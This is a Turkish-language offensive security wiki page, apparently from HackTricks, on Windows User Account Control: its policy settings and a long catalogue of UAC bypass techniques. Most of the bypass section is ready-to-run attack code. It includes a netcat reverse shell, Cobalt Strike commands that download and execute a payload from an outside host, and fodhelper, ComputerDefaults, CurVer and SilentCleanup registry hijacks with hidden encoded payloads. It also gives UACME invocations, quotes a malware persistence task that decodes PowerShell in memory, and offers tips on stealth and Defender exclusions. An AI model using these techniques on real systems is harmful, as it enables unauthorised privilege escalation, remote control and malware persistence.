# UAC - Kullanıcı Hesabı Denetimi

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` düzeyleri vardır ve **yüksek düzeydeki** bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici bu uygulamaların/görevlerin çalışabilmesi için sisteme yönetici düzeyinde erişim yetkisi vermediği sürece uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklere karşı koruyan bir kullanım kolaylığı özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.<sup>[[2]](#references)</sup>

Integrity düzeyleri hakkında daha fazla bilgi:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC kullanıldığında, yönetici kullanıcısına 2 token verilir: normal işlemleri orta integrity düzeyinde gerçekleştirmek için standart kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.

Bu [sayfada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığı ayrıntılı olarak ele alınır; oturum açma süreci, kullanıcı deneyimi ve UAC mimarisi de açıklanır.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına göre yerel düzeyde (secpol.msc kullanarak) yapılandırmak için güvenlik ilkelerini kullanabilir veya Active Directory etki alanı ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmıştır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tabloda ek bilgiler verilmiştir:

| Group Policy Ayarı                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kullanıcı Hesabı Denetimi: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Admin Approval Mode'daki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Güvenli masaüstünde Windows dışı ikili dosyalar için onay iste) |
| [Kullanıcı Hesabı Denetimi: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Güvenli masaüstünde kimlik bilgilerini iste)         |
| [Kullanıcı Hesabı Denetimi: Uygulama yüklemelerini algıla ve yükseltme iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise'da varsayılan olarak devre dışı)           |
| [Kullanıcı Hesabı Denetimi: Yalnızca imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemi göstermesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
| [Kullanıcı Hesabı Denetimi: Yükseltme istenirken güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
| [Kullanıcı Hesabı Denetimi: Dosya ve registry yazma hatalarını kullanıcı başına konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |

### Windows'ta yazılım yüklemeye yönelik ilkeler

**Yerel güvenlik ilkeleri** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların yazılım yüklemesini engelleyecek** şekilde yapılandırılır. Yani yönetici olmayan bir kullanıcı yazılımınızın yükleyicisini indirebilse bile, yönetici hesabı olmadan çalıştıramaz.

### UAC'nin yükseltme istemesini sağlayan Registry Key'ler

Yönetici hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri gerçekleştirmeye çalıştığında UAC'nin **kimlik bilgilerini istemesini** sağlayabilirsiniz. Bu işlem, bir **UAC bypass** yoksa veya saldırgan zaten yönetici olarak oturum açmış değilse, yönetici izinleri gerektiren belirli **registry key'lerin** değiştirilmesini gerektirir.

Kullanıcı **Administrators** grubunda olsa bile, bu değişiklikler yönetsel işlemleri gerçekleştirmek için kullanıcıyı **hesap kimlik bilgilerini yeniden girmeye** zorlar.

**Uygulamada bu yalnızca zaten yükseltilmiş bir token'a, bir UAC bypass'a veya bu key'leri değiştirmenize izin veren bir yanlış yapılandırmaya sahipseniz işe yarar; aksi takdirde registry yazma işlemi engellenir.**

Değiştirmeniz gereken registry key'ler ve girdiler (varsayılan değerleri parantez içinde) şunlardır:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden elle de yapılabilir. Değişiklik yapıldıktan sonra, yönetsel işlemler kullanıcıdan kimlik bilgilerini yeniden girmesini ister.

### Not

**User Account Control bir güvenlik sınırı değildir.** Bu nedenle standart kullanıcılar, yerel bir privilege escalation exploit olmadan hesaplarından çıkıp yönetici hakları elde edemez.

### Kullanıcıdan 'bilgisayara tam erişim' isteme

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC Ayrıcalıkları

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki süreçlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu, tarayıcı düşük bütünlük belirtecinde çalıştırılarak yapılır. Tarayıcı düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi sürecin bütünlük düzeyini denetler ve erişime buna göre izin verir. Bu özellik, uzaktan kod yürütme saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının listesini içeren bir erişim belirteci oluşturur. Ayrıcalıklar, kullanıcı hakları ve yeteneklerinin birleşimi olarak tanımlanır. Belirteç ayrıca kullanıcının kimlik bilgilerini de içerir; bunlar kullanıcıyı bilgisayarda ve ağ kaynaklarında kimlik doğrulamak için kullanılan bilgilerdir.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` kayıt defteri anahtarını** ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı kayıt defterinde açıkça gösterdiğinden bunu yalnızca güvenli sistemlerde kullanın.

Registry Editor veya `reg add` kullanarak aşağıdaki anahtarları ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Normal oturum açma davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Kurban makineye grafiksel erişiminiz varsa UAC bypass işleminin oldukça kolay olduğunu unutmayın; UAC istemi göründüğünde "Yes" düğmesine tıklamanız yeterlidir.

UAC bypass şu durumda gereklidir: **UAC etkin, süreciniz orta bütünlük bağlamında çalışıyor ve kullanıcınız administrators grubuna ait.**

UAC en yüksek güvenlik düzeyindeyken (Always), diğer düzeylerden herhangi birindeyken (Default) olduğuna kıyasla **bypass etmenin çok daha zor olduğunu** belirtmek önemlidir.

### Orta bütünlüklü bir shell'den hızlı ön değerlendirme

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve makinenin build sürümüne göre bilinen, çalışan yöntemleri belirleyin:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Pratik notlar:
- `EnableLUA=0` ise bypass yapmanız gerekmez: herhangi bir admin token doğrudan yüksek bütünlük düzeyi isteyebilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM tabanlı bypass'lar için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olacağını varsaymak yerine tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ `AlwaysNotify compatible` bazı yöntemleri izlemektedir.<sup>[[3]](#references)</sup>

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdaki gibi bir yöntemle admin ayrıcalıklarıyla (yüksek bütünlük düzeyinde) **reverse shell çalıştırabilirsiniz**:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + yeniden kullanılabilir debug object

AppInfo local RPC arayüzü `201ef99a-7fa0-444c-9399-19ba84f12a1a`, debugging etkin bir process oluşturabilir. Aynı thread üzerinde debug aracılığıyla oluşturulan process’ler thread’in debug object’ini paylaşır; oluşturma debug event’i, RPC sonucu yalnızca sınırlı erişim verse bile tam erişimli bir process handle taşır. Böylece debug object’in yeniden kullanılması, Administrators grubunun orta bütünlük düzeyindeki bir üyesi için UAC primitive’ine dönüşür.<sup>[[11]](#references)[[12]](#references)</sup>

Uygulanabilir bir zincir:<sup>[[11]](#references)[[12]](#references)</sup>

1. Debugging etkin, yükseltilmemiş geçici bir process oluşturmak için local RPC metodunu (doğrudan veya `NdrAsyncClientCall` aracılığıyla) çağırın.
2. `NtQueryInformationProcess` ile `ProcessDebugObjectHandle` sorgulayın, `NtRemoveProcessDebug` ile bağlantısını kesin, object’i saklayın ve geçici process’i sonlandırın.
3. Güvenilir, auto-elevated bir process oluşturmak için aynı RPC arayüzünü kullanın; ardından `DbgUiSetThreadDebugObject` aracılığıyla saklanan object’i çağıran thread’e ilişkilendirin.
4. `WaitForDebugEvent` çağırın ve `CREATE_PROCESS_DEBUG_EVENT` process handle’ını alın; devam etmeden önce `NtDuplicateObject` ile handle’ı çoğaltın.
5. Çoğaltılan handle’ı `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` işlevine verin ve payload’ı genişletilmiş bir startup-info yapısıyla başlatın. Böylece hem yükseltilmiş process context’i yeniden kullanılır hem de child process’e güvenilir görünen bir parent ilişkisi sağlanır.

Yalnızca auto-elevated binary’yi değil, kısa işlem dizisini de arayın: local AppInfo RPC ile process oluşturma, `ProcessDebugObjectHandle` sorguları, debugger detach/reattach, hemen ardından gelen bir creation-debug event’i, handle çoğaltma ve kayıtlı parent’ı creation API’lerini çalıştıran process ile eşleşmeyen bir child.<sup>[[12]](#references)</sup>

### **Çok** Temel UAC "bypass" (dosya sistemine tam erişim)

Administrators grubunda yer alan bir kullanıcıyla shell’iniz varsa, SMB üzerinden paylaşılan **C$** öğesini yeni bir diske yerel olarak bağlayabilirsiniz; böylece **dosya sistemindeki her şeye** (hatta Administrator home folder’ına bile) erişebilirsiniz.

> [!WARNING]
> **Görünüşe göre bu numara artık çalışmıyor**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik düzeyine ayarlanmamışsa işe yarar.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** ve **Metasploit**'te de **UAC**'yi **bypass** etmek için çeşitli modüller bulunur.

### Yükseltilmiş COM arayüzleri (`ICMLuaUtil` / `CMSTPLUA`)

Otomatik yükseltilen COM nesneleri, modern sürümlerde hâlâ kullanışlı bir UAC saldırı yüzeyidir. `ICMLuaUtil`, UACME'de güncel Windows sürümlerinde çalıştığı belirtilen yöntemler arasında yer alıyor. Saldırı araçları da COM Elevation Moniker'ı çağırmadan önce etkileşimli bir masaüstü süreci ve 64 bit yürütme kullanıp bazen PEB/süreç taklidi yaparak `CMSTPLUA` yöntemini geliştirmeye devam ediyor.<sup>[[3]](#references)</sup>

Uygulamaya yönelik ipuçları:
- Kullanıcının **etkileşimli oturumunda** çalışan bir **64 bit** süreci tercih edin (genellikle `explorer.exe` veya onun alt süreci).
- Ham bir shell başarısız olursa, basit bir `CreateProcess` sarmalayıcısı yerine BOF / UACME uygulamasından yeniden deneyin.
- Alt sürecin **ayrı bir yükseltilmiş süreçte** çalışmasını bekleyin; birçok BOF mevcut beacon'ı yerinde yükseltmez.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde dokümantasyon ve araç bulunur.

### UAC bypass exploit'leri

[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; derleme birkaç yürütülebilir dosya oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`). Bu nedenle hedef build'e uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
Dikkatli olun: bazı bypass yöntemleri, kullanıcıyı uyarabilecek görünür programlar veya istemler başlatır.<sup>[[3]](#references)</sup>

UACME'de her tekniğin çalışmaya başladığı **build sürümü** belirtilir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows sürümü `1607`'yi bulabilirsiniz.

Uygulanabilir bir iş akışı, önce **host build'ini puanlamak**, ardından eşleşen yöntemi çalıştırmaktır:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızla karşılaştırır; bu da işe yaramayan PoC'leri hızlıca elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass'ı belirli bir build ile eşleştirmek için hâlâ en iyi herkese açık katalogdur. 3.7.1 sürümünde 83–85 yöntemleri eklendi; önceki sürümde ise mevcut yöntemler **Windows 11 25H2**'ye karşı yeniden test edildi. Eski bir PoC'nin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymak yerine yöntem tablosunu ve sürüm notlarını yeniden kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify destekleyen WNF/UIAccess zincirleri (UACME 3.7.1)

`Always Notify`, tüm UAC bypass'larını ortadan kaldırmaz. UACME 3.7.1, kullanıcı denetimindeki ortam/protokol durumunu yükseltilmiş zamanlanmış görev veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** WNF tetiklemeli `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` görevinde yükseltilmiş `taskhostw.exe`'nin `unifiedconsent.dll` dosyasını side-load etmesini sağlamak için `SystemRoot` değerini yönlendirin. UACME, bu yöntemi Windows 10 build 19041'den itibaren izler.
- **84 — TabTip:** Aynı ortam değişkeni primitive'ini UIAccess `TabTip.exe` üzerinde kullanın. Bu program, build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` dosyalarını yükler; ardından ortaya çıkan yüksek bütünlük seviyeli UIAccess bağlamından pivot yapın. UACME, bu yöntemi Windows 8.1 / Server 2016'dan itibaren izler.
- **85 — Narrator:** Kullanıcı başına `feedback-hub` protokolünü ele geçirin, Narrator'ı `Alt+CapsLock+F` ile çalıştırın, ardından `OskSupport.dll` dosyasını side-load eden yazılabilir bir `osk.exe` kopyası başlatın. Bunun için etkileşimli bir masaüstü gerekir. UACME, bu yöntemi Windows 10 1809 / Server 2019'dan itibaren izler.

Payload birimlerini ve Akagi'yi UACME'de belgelendiği şekilde derledikten sonra eşleşen yöntem numarasını kullanın (isteğe bağlı komut varsayılan olarak `cmd.exe` olur):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 ve 85, UIAccess/masaüstü etkileşimine bağlıdır; bu nedenle Session 0'dan veya etkileşimsiz bir hizmet kabuğundan çalıştırıldıklarında değişiklik yapmadan çalışacaklarını varsaymayın. Üçü de ortam/protokol durumunu değiştirir ve DLL'leri hazırlar; uygulamayı inceleyin ve test ettikten sonra bu kalıntıları kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilir ikili `fodhelper.exe`, modern Windows'ta otomatik olarak yükseltilir. Başlatıldığında, aşağıdaki kullanıcı başına registry yolunu `DelegateExecute` verb'ünü doğrulamadan sorgular. Buraya bir komut yerleştirmek, Administrators grubunda olan bir kullanıcının Medium Integrity düzeyindeki bir işlemin UAC istemi olmadan High Integrity düzeyinde bir işlem başlatmasını sağlar.

fodhelper tarafından sorgulanan registry yolu:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notlar:
- Geçerli kullanıcı Administrators grubunun üyesiyse ve UAC düzeyi varsayılan/esnek ayardaysa çalışır (ek kısıtlamalarla birlikte Always Notify değil).
- 64 bit Windows'ta 32 bit bir süreçten 64 bit PowerShell başlatmak için `sysnative` yolunu kullanın.
- Payload herhangi bir komut olabilir (PowerShell, cmd veya bir EXE yolu). Gizlilik için kullanıcıya istem gösteren arayüzlerden kaçının.

#### Aynı `ms-settings` handler'ı için `ComputerDefaults.exe` trigger'ı

`ComputerDefaults.exe`, `fodhelper.exe` ile aynı kullanıcıya özel `ms-settings\Shell\Open\command` ilişkilendirmesini çözümler.<sup>[[13]](#references)[[14]](#references)</sup> Varsayılan komutu ve yukarıdaki boş `DelegateExecute` değerini ayarladıktan sonra, alternatif bir trigger olarak `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kullanın; kayıt defteri kurulumunu tekrarlamayın.<sup>[[13]](#references)[[14]](#references)</sup> Yukarıdaki `fodhelper.exe` notlarında belirtilen orta bütünlük düzeyindeki yönetici ve UAC ilkesi ön koşulları burada da geçerlidir.<sup>[[2]](#references)[[3]](#references)</sup> UACME, bu trigger'ı Windows 10 RS4 (build 17134) sürümünden itibaren listeliyor; bu nedenle hedef build'de doğrulayın.<sup>[[3]](#references)</sup>

#### CurVer/uzantı hijack varyantı (yalnızca HKCU)

`fodhelper.exe`'yi kötüye kullanan güncel örnekler `DelegateExecute` kullanmaktan kaçınıyor ve bunun yerine kullanıcıya özel `CurVer` değeri üzerinden **`ms-settings` ProgID'sini yönlendiriyor**. Auto-elevated binary, handler'ı hâlâ `HKCU` altında çözümler; bu nedenle anahtarları oluşturmak için admin token gerekmez:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Yetki yükseltildikten sonra malware, genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` yaparak **gelecekteki istemleri devre dışı bırakır**, ardından ek defense evasion adımları uygular (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışması için persistence mekanizmasını yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** saklar ve her saat bellekte çözüp çalıştırır:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Bu varyant dropper'ı yine temizleyip yalnızca staged payloads'ları bırakır; bu nedenle tespit, **`CurVer` hijack**'inin, `ConsentPromptBehaviorAdmin` kurcalamasının, Defender exclusion oluşturulmasının veya PowerShell'i bellekte çözen zamanlanmış görevlerin izlenmesine bağlıdır.<sup>[[5]](#references)</sup>

### `SilentCleanup` görevi üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı ortamından genişletir. `HKCU\Environment\windir` değerini kontrol edebiliyorsanız, bu genişletmeyi keyfi bir komuta yönlendirip onay iletişim kutusu olmadan yüksek bütünlük düzeyi elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME bu tekniği etkin tuttuğundan ve son sorun kayıtları Windows 11 24H2'de yalnızca küçük tırnaklama ayarlamalarının gerekebileceğini gösterdiğinden, bu yöntemi güncel derlemelerde test etmeye hâlâ değer.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Bu derlemede görev yolu tırnak içine alıyorsa, sonunda tırnak bulunan bir payload ile yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kullanan birçok klasik UAC bypass, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0**'da çalışan bir hizmet çoğu zaman yeterli olmaz.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e geçiş yapın:

![ms-settings'i özel bir uzantıya (.thm) yönlendirin ve bu uzantıyı payload'ımıza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak bunu elde edebilirsiniz. Session değeri... olan bir process'e geçiş yapın...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalı)

### GUI ile UAC Bypass

Bir **GUI'ye erişiminiz varsa, UAC istemi göründüğünde kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle, bir GUI oturumu edinmek çoğu zaman UAC'nin yarattığı pratik engeli aşmak için yeterlidir.

Ayrıca, birinin kullandığı bir GUI oturumu edinirseniz (potansiyel olarak RDP üzerinden), **yönetici olarak çalışan bazı araçlar** bulunabilir; bu araçlar üzerinden, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi, UAC yeniden istemde bulunmadan doğrudan **yönetici olarak** bir **cmd** çalıştırabilirsiniz. Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültü sorun değilse, [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar yükseltme isteğini tekrarlayabilir.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

**UACME**'ye bakarsanız, birçok UAC bypass'ın **DLL hijacking** kullandığını fark edeceksiniz (genellikle yükseltilmiş bir binary'ye, saldırganın kontrolündeki bir DLL'yi yazılabilir bir konumdan yükleterek). [DLL hijacking güvenlik açığını nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **Aut​​oelevate** olacak bir binary bulun (çalıştırıldığında yüksek integrity level'da çalıştığını kontrol edin).
